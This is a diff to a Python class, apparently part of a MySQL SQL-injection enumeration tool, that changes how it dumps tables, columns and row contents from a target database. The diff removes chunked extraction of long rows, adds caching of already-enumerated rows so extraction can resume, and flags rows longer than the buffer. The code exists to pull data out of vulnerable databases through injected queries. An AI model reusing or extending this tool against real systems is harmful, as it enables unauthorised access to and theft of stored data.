@@ -90,6 +90,15 @@ class MYSQLENUM():
                     "table_count" : self.num_tables_pl}
         
         self.DB = {}
+        
+        self.long_rows = []
+
+    def get_curr_enum_rows(self, table_name, col_name):
+        '''Get a list of currently enumerated row contents for a partiuclar table.column'''
+        
+        rows = self.DB['tables'][table_name]['cols'][col_name]
+        
+        return ["{} ({})".format(row[1],row[0]) for row in rows]
 
     def get_row_len(self, row, table, col):
         '''Retrieve the length of characters in a particular row from a table.column'''
@@ -101,58 +110,6 @@ class MYSQLENUM():
         row_len = self.send_sqli()
         
         return row_len
-
-    def get_partial_row_content(self, row, table, col, pos, buff):
-        '''Retrieve partial conetents of a row based on the offest(pos) and buffer length'''
-        
-        self.construct_vuln_field(self.get_partial_row_pl.format(
-                                table_name=table,col_name=col, pos=pos, buff=buff)
-                                +self.limits.replace('~num~',row))
-        
-        enum_logger.info("Querying partial content of row no. '{}' for {}.{} [pos: {}, buff: {}]".format(
-                        row, table, col, pos, buff))
-        
-        partial = self.send_sqli()
-        
-        return partial
-
-    def generate_partial_row_content(self, row, table, col, buff, iterations):
-        '''Generator for retrieving the complete contents of a row'''
-        
-        prog_bar = trange(iterations)
-        
-        for pos in prog_bar:
-            
-            row_part = self.get_partial_row_content(row, table, col, (buff*pos)+1, buff)
-            
-            prog_bar.set_description("Retrieving partial row: {}".format(clr.red(row_part)))
-            
-            yield row_part
-        
-    def get_long_row_content(self, row, table, col):
-        
-        complete_row = ""
-        
-        row_len = self.get_row_len(row, table, col)
-        
-        iterations = int(row_len)//self.buff
-        
-        chars_retrieved = iterations*self.buff
-        
-        residue_len = int(row_len) - chars_retrieved
-        
-        row_content_iterator = self.generate_partial_row_content(row, table, col, self.buff, iterations)
-        
-        for partial_row_content in row_content_iterator:
-            
-            complete_row = complete_row+partial_row_content
-        
-        if residue_len > 0:
-            
-            complete_row = complete_row+self.get_partial_row_content(row, table, col, chars_retrieved+1, residue_len)
-        
-        return complete_row
-        
 
     def get_params(self):
         '''Construct and return a dictionary of the command line parameters provided'''
@@ -307,7 +264,7 @@ class MYSQLENUM():
     def get_cols(self, col_count, table):
         '''Retrieve the list of columns names in a table'''
 
-        cols_list = {}
+        cols_dict = {}
         
         enum_logger.info("Enumerated column: '{}' ... ".format(table))
         
@@ -323,9 +280,9 @@ class MYSQLENUM():
             
             prog_bar.set_description("Column: '{}'".format(clr.red(col)))
 
-            cols_list[col] = None
+            cols_dict[col] = []
             
-        return cols_list
+        return cols_dict
 
     def get_rows(self, col_name, table_name, limit=None):
         '''Retrieve the list of rows for a particular column in a table'''
@@ -362,13 +319,17 @@ class MYSQLENUM():
         
         row_list = []
         
+        curr_enumerated = len(self.DB['tables'][table_name]['cols'][col_name])
+        
         if limit:
 
-            prog_bar = trange(limit)
+            prog_bar = trange(curr_enumerated, limit)
             
         else:
+
+            row_count = int(self.DB['tables'][table_name]['row_count'])
             
-            prog_bar = trange(int(self.DB['tables'][table_name]['row_count']))
+            prog_bar = tqdm(range(curr_enumerated,row_count))
             
         
         for i in prog_bar:
@@ -380,14 +341,27 @@ class MYSQLENUM():
             row = self.send_sqli()
             
             row_len = self.get_row_len(str(i), table_name, col_name)
+            
+            self.DB['tables'][table_name]['cols'][col_name].append((row_len,row))
+            
+            index_of_last = len(self.DB['tables'][table_name]['cols'][col_name])-1
+            
+            if int(row_len) > self.buff:
+                
+                row = row+" ({})".format(clr.red(row_len))
+                
+                self.long_rows.append((table_name,col_name,index_of_last))
 
-            row = row+" ({})".format(clr.red(row_len)) if (int(row_len) > self.buff) else row+" ({})".format(row_len)
+            else:
+                
+                row = row+" ({})".format(row_len)
             
             prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
             
             row_list.append(row)
             
             yield row
+
                          
     def send_sqli(self):
         '''Send the SQL query+payload to be executed on the target via SQL injection'''
